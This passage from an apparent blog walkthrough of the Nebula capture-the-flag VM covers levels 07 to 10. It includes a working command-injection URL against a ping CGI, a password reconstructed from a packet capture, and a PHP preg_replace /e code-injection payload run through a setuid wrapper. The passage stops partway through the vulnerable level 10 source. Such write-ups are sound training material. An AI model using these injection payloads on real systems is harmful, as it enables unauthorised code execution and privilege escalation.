</span><span class='line'>  <span class="k">foreach</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@output</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="s">&quot;$line&quot;</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># check if Host set. if not, display normal page, etc</span>
</span><span class='line'>
</span><span class='line'><span class="n">ping</span><span class="p">(</span><span class="n">param</span><span class="p">(</span><span class="s">&quot;Host&quot;</span><span class="p">));</span>
</span></code></pre></td></tr></table></div></figure>


<p>Start by looking inside the <em>thttpd.conf</em> for some options and information about how the server is set up (thttpd is a HTTP server designed for simplicity, speed and portability). I only kept the lines that interested me in the output below:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>...
</span><span class='line'># Specifies an alternate port number to listen on.
</span><span class='line'>port=7007
</span><span class='line'>
</span><span class='line'># Specifies what user to switch to after initialization when started as root.
</span><span class='line'>user=flag07
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>So the web server runs as the flag07 user. I pointed my browser to <a href="http://192.168.80.133:7007/index.cgi">http://192.168.80.133:7007/index.cgi</a> and saw some usage output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage: ping [-LRUbdfnqrvVaAD] [-c count] [-i interval] [-w deadline]
</span><span class='line'>            [-p pattern] [-s packetsize] [-t ttl] [-I interface]
</span><span class='line'>            [-M pmtudisc-hint] [-m mark] [-S sndbuf]
</span><span class='line'>            [-T tstamp-options] [-Q tos] [hop1 ...] destination</span></code></pre></td></tr></table></div></figure>


<p>Looking in the source code, the program needs a Host parameter, otherwise it will display this usage information. I tested it by changing the URL to <a href="http://192.168.80.133:7007/index.cgi?Host=localhost">http://192.168.80.133:7007/index.cgi?Host=localhost</a> and the ping was run successfully:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PING localhost (127.0.0.1) 56(84) bytes of data.
</span><span class='line'>64 bytes from localhost (127.0.0.1): icmp_req=1 ttl=64 time=0.025 ms
</span><span class='line'>64 bytes from localhost (127.0.0.1): icmp_req=2 ttl=64 time=0.028 ms
</span><span class='line'>64 bytes from localhost (127.0.0.1): icmp_req=3 ttl=64 time=0.034 ms
</span><span class='line'>
</span><span class='line'>--- localhost ping statistics ---
</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 1999ms
</span><span class='line'>rtt min/avg/max/mdev = 0.025/0.029/0.034/0.003 ms</span></code></pre></td></tr></table></div></figure>


<p>So it&rsquo;s now a matter of injecting the command we want this program to run. I first tried <a href="http://192.168.80.133:7007/index.cgi?Host=localhost;getflag">http://192.168.80.133:7007/index.cgi?Host=localhost;getflag</a> to stack another command after the ping, but it didn&rsquo;t work. I had to URL encode the ; for it to work: <a href="http://192.168.80.133:7007/index.cgi?Host=localhost%3Bgetflag">http://192.168.80.133:7007/index.cgi?Host=localhost%3Bgetflag</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PING localhost (127.0.0.1) 56(84) bytes of data.
</span><span class='line'>64 bytes from localhost (127.0.0.1): icmp_req=1 ttl=64 time=0.017 ms
</span><span class='line'>64 bytes from localhost (127.0.0.1): icmp_req=2 ttl=64 time=0.036 ms
</span><span class='line'>64 bytes from localhost (127.0.0.1): icmp_req=3 ttl=64 time=0.045 ms
</span><span class='line'>
</span><span class='line'>--- localhost ping statistics ---
</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 1998ms
</span><span class='line'>rtt min/avg/max/mdev = 0.017/0.032/0.045/0.013 ms
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h3>Level 08</h3>

<p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p>

<p>To do this level, log in as the level08 account with the password level08. Files for this level can be found in /home/flag08.</p>

<p>There is a capture.pcap file lying around for our convenience. I transfered it to my machine so I can look at it in Wireshark. Followed TCP Stream and saw a potential password:</p>

<p><img class="center" src="http://chousensha.github.io/images/nebula/level8.png" title="level8" alt="level8"></p>

<p>So the user tried to log in to something called wwwbugs, which I assumed it&rsquo;s irrelevant to the challenge. I tried SSH&#8217;ing as flag08 with the password of <em>backdoor&hellip;00Rm8.ate</em>, but of course it didn&rsquo;t work. Next I tried removing the dots and keeping only the letters and numbers but that didn&rsquo;t work either. But I was fairly sure the password must be related to this string. When looking at the stream in hex, I thought there must be a pattern for those dots:</p>

<p><img class="center" src="http://chousensha.github.io/images/nebula/level8hex.png" title="level8hex" alt="level8hex"></p>

<p>The hex for all the dots in the string is <em>7f</em>, but when looking at the Ascii table, hex encoding for dots is <em>2e</em>. So these aren&rsquo;t really dots! At the very end of the Ascii table I saw that <em>7f</em> actually represents the DEL key. So these dots are placeholders for when the DEL key was pressed. The user must have had trouble remembering his password or something. With this discovery in mind, it&rsquo;s possible to reconstruct the valid password:</p>

<ul>
<li><p>backdoor&hellip;00Rm8.ate &ndash;> backdoor + DELETE 3 times = backd</p></li>
<li><p>00Rm8.ate + DELETE 1 time = 00Rmate</p></li>
</ul>


<p>So the password is  <code>backd00Rmate</code>. At least now it looks more like a password. Tried to SSH as flag08 now with this password and it worked!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level08@nebula:/home/flag08$ ssh flag08@localhost
</span><span class='line'>  
</span><span class='line'>      _   __     __          __     
</span><span class='line'>     / | / /__  / /_  __  __/ /___ _
</span><span class='line'>    /  |/ / _ \/ __ \/ / / / / __ `/
</span><span class='line'>   / /|  /  __/ /_/ / /_/ / / /_/ / 
</span><span class='line'>  /_/ |_/\___/_.___/\__,_/_/\__,_/  
</span><span class='line'>                                    
</span><span class='line'>    exploit-exercises.com/nebula
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>For level descriptions, please see the above URL.
</span><span class='line'>
</span><span class='line'>To log in, use the username of "levelXX" and password "levelXX", where
</span><span class='line'>XX is the level number.
</span><span class='line'>
</span><span class='line'>Currently there are 20 levels (00 - 19).
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>flag08@localhost's password: 
</span><span class='line'>Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>New release '12.04 LTS' available.
</span><span class='line'>Run 'do-release-upgrade' to upgrade to it.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>The programs included with the Ubuntu system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span><span class='line'>applicable law.
</span><span class='line'>
</span><span class='line'>flag08@nebula:~$ getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h3>Level 09</h3>

<p>There’s a C setuid wrapper for some vulnerable PHP code…</p>

<p>To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">spam</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="nv">$email</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\./&quot;</span><span class="p">,</span> <span class="s2">&quot; dot &quot;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$email</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/@/&quot;</span><span class="p">,</span> <span class="s2">&quot; AT &quot;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="nv">$email</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">markup</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$use_me</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/(\[email (.*)\])/e&quot;</span><span class="p">,</span> <span class="s2">&quot;spam(</span><span class="se">\&quot;\\</span><span class="s2">2</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\[/&quot;</span><span class="p">,</span> <span class="s2">&quot;&lt;&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\]/&quot;</span><span class="p">,</span> <span class="s2">&quot;&gt;&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="nv">$contents</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$output</span> <span class="o">=</span> <span class="nx">markup</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="nv">$output</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Ok, me and regex don&rsquo;t get along at all! After looking at the code, I had only 2 ideas / leads:</p>

<ul>
<li><p>the <em>markup</em> function takes a <strong>$use_me</strong> parameter which isn&rsquo;t used in the code</p></li>
<li><p>the solution probably revolves around a <em>preg_replace</em> exploit (I had a distant memory of encountering and exploiting this in another challenge which I couldn&rsquo;t remember)</p></li>
</ul>


<p>After some googling, I found out that indeed <em>preg_replace</em> can be exploited, but first what exactly does this function do?</p>

<ul>
<li><strong>preg_replace($pattern, $replacement, $subject)</strong> &ndash; Searches <em>subject</em> for matches to <em>pattern</em> and replaces them with <em>replacement</em>.</li>
</ul>


<p>Now let&rsquo;s see how and why it can be exploited. From <a href="http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php">http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php</a> I read this:</p>

<blockquote><p>e (PREG_REPLACE_EVAL) &ndash; If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string,
evaluates it as PHP code, and uses the result for replacing the search string. Single quotes, double quotes, backslashes () and NULL chars will
be escaped by backslashes in substituted backreferences.</p></blockquote>

<p>On the page there is also a security warning for using this function and an example of code injection. Remote code execution is possible because unsanitised user input is <em>eval()</em>ed.</p>

<p>Also you can read more about this vulnerability and exploit here: <a href="http://www.madirish.net/402">http://www.madirish.net/402</a></p>

<p>Before anything else, let&rsquo;s just see what happens when running the binary. I made some files in <em>tmp</em> for this purpose to avoid reading superfluous system files:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level09@nebula:/home/flag09$ ./flag09 /tmp/test
</span><span class='line'>PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
</span><span class='line'>nothing to see here</span></code></pre></td></tr></table></div></figure>


<p>PHP complained about the missing $argv[2] (remember the <em>$use_me</em> is unused), but it still read the file. If I tried 2 arguments, the error disappeared, but the second file wasn&rsquo;t output (how could they forget to use the <em>$use_me</em>?!). Ok, enough of that! So I know now that I can get arbitrary code execution by injecting some code to be <em>eval()</em>ed by <em>preg_replace</em>. This means that I will actually have to grasp what the regex is doing&hellip;oh, the fun!</p>

<p>First of all, the line that facilitates the exploitation is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/(\[email (.*)\])/e&quot;</span><span class="p">,</span> <span class="s2">&quot;spam(</span><span class="se">\&quot;\\</span><span class="s2">2</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>This operates on the contents of the file that was read, you can see that the <em>/e</em> modifier is being used, and also that the <em>spam()</em> function is called. This function seems to replace <code>.</code> with <em>dot</em> and <em>@</em> with <em>AT</em>, but I plugged it into a PHP interpreter to be sure:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>haxor@hack.com becomes haxor AT hack dot com</span></code></pre></td></tr></table></div></figure>


<p>It is this function where we will inject our code. But we have to match the pattern that is expected. After some pain and suffering, and 2 excellent regex resources that even my regex-incompatible brain could grasp (<a href="http://gnosis.cx/publish/programming/regular_expressions.html">this tutorial</a> and <a href="http://www.rexegg.com/regex-quickstart.html">this cheatsheet</a>), I concluded that the pattern to be matched is like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[email haxor@hack.com]</span></code></pre></td></tr></table></div></figure>


<p>After the replacement operations the above becomes <code>haxor AT hack dot com</code> and the [] is replaced with &lt;>. Now for the exploitation. On the <a href="http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php">http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php</a> page, the exploit string for the provided code is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;h1&gt;{${eval($_GET[php_code])}}&lt;/h1&gt;</span></code></pre></td></tr></table></div></figure>


<p>I admit I don&rsquo;t understand why it works while sandwiched between {}. The h1 tags and $_GET apply to the example code on the page, so in this case I kept the string:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>{${eval()}}</span></code></pre></td></tr></table></div></figure>


<p>Instead of <em>eval()</em>, we want <em>system()</em> to call an external program. Of course don&rsquo;t forget that you have to sandwich it inside the pattern <code>[email ]</code>. Now it becomes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[email {${system()}}]</span></code></pre></td></tr></table></div></figure>


<p>Cool. Now we want to run <em>getflag</em>, so how should we pass it to <em>system()</em>? Remember the unsued variable <em>$use_me</em>!</p>

<p>At this point I injected some harmless printing functions inside an interpreter to check if the injection worked successfully, and when it did, I moved back to our particular case. So here&rsquo;s how the situation looks now:</p>

<ul>
<li><p>we want to run <em>getflag</em></p></li>
<li><p>we can run external commands in PHP with <em>system()</em></p></li>
<li><p>we have the $use_me parameter available and unused anywhere, so why not use it?</p></li>
<li><p>we have to put the exploit into a file to be read by the binary</p></li>
</ul>


<p>With all these requirements in mind, I created a file with the exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level09@nebula:/home/flag09$ cat /tmp/useme
</span><span class='line'>[email {${system($use_me)}}]</span></code></pre></td></tr></table></div></figure>


<p>Now we can finally use that $use_me variable, since whatever we place in it will be executed by <em>system()</em>. Running it now produces an error but it still does the job:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level09@nebula:/home/flag09$ ./flag09 /tmp/useme getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span><span class='line'>PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php(15) : regexp code on line 1</span></code></pre></td></tr></table></div></figure>


<p>Pff, this was a difficult level, but really interesting and I learned something!</p>

<h3>Level 10</h3>

<p>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.</p>

<p>To do this level, log in as the level10 account with the password level10 . Files for this level can be found in /home/flag10.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;errno.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;netinet/in.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'> <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
</span><span class='line'> <span class="kt">char</span> <span class="o">*</span><span class="n">host</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'> <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s file host</span><span class="se">\n\t</span><span class="s">sends file to host if you have access to it</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'> <span class="p">}</span>
</span><span class='line'>
</span><span class='line'> <span class="n">file</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'> <span class="n">host</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'> <span class="k">if</span><span class="p">(</span><span class="n">access</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">R_OK</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">ffd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">rc</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connecting to %s:18211 .. &quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">));</span>
</span><span class='line'>  <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
</span><span class='line'>  <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">host</span><span class="p">);</span>
</span><span class='line'>  <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">18211</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>   <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to connect to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
</span><span class='line'>   <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define HITHERE &quot;.oO Oo.\n&quot;</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">HITHERE</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">HITHERE</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>   <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to write banner to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
</span><span class='line'>   <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="cp">#undef HITHERE</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connected!</span><span class="se">\n</span><span class="s">Sending file .. &quot;</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">ffd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">ffd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>   <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Damn. Unable to open file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>   <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
